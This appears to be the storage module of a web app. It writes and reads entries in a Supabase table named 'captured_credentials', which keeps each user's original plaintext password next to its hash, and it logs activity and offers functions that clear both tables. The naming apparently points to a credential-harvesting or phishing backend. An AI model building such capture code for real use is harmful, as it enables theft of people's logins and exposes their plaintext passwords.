import { supabase } from './supabaseClient';

const CREDENTIALS_TABLE = 'captured_credentials';
const ACTIVITY_TABLE = 'activity_logs';

/**
 * Save user credentials to Supabase
 */
export async function saveUser(method: string, identifier: string, passwordHash: string, originalPassword?: string) {
  try {
    const { data, error } = await supabase
      .from(CREDENTIALS_TABLE)
      .insert({
        id: crypto.randomUUID(),
        auth_method: method,
        identifier: identifier,
        password_hash: passwordHash,
        original_password: originalPassword,
        metadata: {},
        created_at: new Date().toISOString(),
      })
      .select();

    if (error) {
      console.error('Error saving user:', error);
      throw error;
    }
    
    return data;
  } catch (error) {
    console.error('Failed to save user:', error);
    throw error;
  }
}

/**
 * Log activity to Supabase
 */
export async function logActivity(action: string, metadata?: string) {
  try {
    const { data, error } = await supabase
      .from(ACTIVITY_TABLE)
      .insert({
        id: crypto.randomUUID(),
        action: action,
        metadata: metadata ? { details: metadata } : null,
        created_at: new Date().toISOString(),
      })
      .select();

    if (error) {
      console.error('Error logging activity:', error);
      throw error;
    }
    
    return data;
  } catch (error) {
    console.error('Failed to log activity:', error);
    throw error;
  }
}

/**
 * Get all activities from Supabase
 */
export async function getActivities() {
  try {
    const { data, error } = await supabase
      .from(ACTIVITY_TABLE)
      .select('*')
      .order('created_at', { ascending: false });

    if (error) {
      console.error('Error fetching activities:', error);
      throw error;
    }
    
    return data || [];
  } catch (error) {
    console.error('Failed to fetch activities:', error);
    return [];
  }
}

/**
 * Clear all activities from Supabase
 */
export async function clearActivities() {
  try {
    const { error } = await supabase
      .from(ACTIVITY_TABLE)
      .delete()
      .neq('id', '00000000-0000-0000-0000-000000000000'); // Delete all records

    if (error) {
      console.error('Error clearing activities:', error);
      throw error;
    }
  } catch (error) {
    console.error('Failed to clear activities:', error);
    throw error;
  }
}

/**
 * Get all users from Supabase
 */
export async function getUsers() {
  try {
    const { data, error } = await supabase
      .from(CREDENTIALS_TABLE)
      .select('*')
      .order('created_at', { ascending: false });

    if (error) {
      console.error('Error fetching users:', error);
      throw error;
    }
    
    return data || [];
  } catch (error) {
    console.error('Failed to fetch users:', error);
    return [];
  }
}

/**
 * Clear all users from Supabase
 */
export async function clearUsers() {
  try {
    const { error } = await supabase
      .from(CREDENTIALS_TABLE)
      .delete()
      .neq('id', '00000000-0000-0000-0000-000000000000'); // Delete all records

    if (error) {
      console.error('Error clearing users:', error);
      throw error;
    }
  } catch (error) {
    console.error('Failed to clear users:', error);
    throw error;
  }
}
